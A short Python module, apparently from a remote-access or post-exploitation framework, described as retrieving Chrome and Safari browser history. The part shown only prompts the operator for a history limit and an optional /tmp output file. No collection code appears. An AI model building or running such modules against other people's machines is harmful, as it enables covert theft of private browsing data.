# -*- coding: utf-8 -*-
__author__ = "Marten4n6"
__license__ = "GPLv3"

from server.modules.helper import *


class Module(ModuleABC):
    def get_info(self) -> dict:
        return {
            "Author:": ["Marten4n6"],
            "Description": "Retrieve browser history (Chrome and Safari).",
            "References": [],
            "Stoppable": False
        }

    def setup(self, view) -> Tuple[bool, Optional[dict]]:
        history_limit = view.prompt("History limit [ENTER for 10]: ")
        output_file = view.prompt("Would you like to output to a file? [y/N]").lower()

        if not history_limit:
            history_limit = 10
        if not output_file or output_file == "n":
            output_file = ""
        elif output_file:
            output_file = "/tmp/{}.txt".format(random_string(8))

        if not str(history_limit).isdigit():
            view.output("Invalid history limit.", "attention")
            return False, None
        else:
            return True, {
                "history_limit": history_limit,
                "output_file": output_file
            }
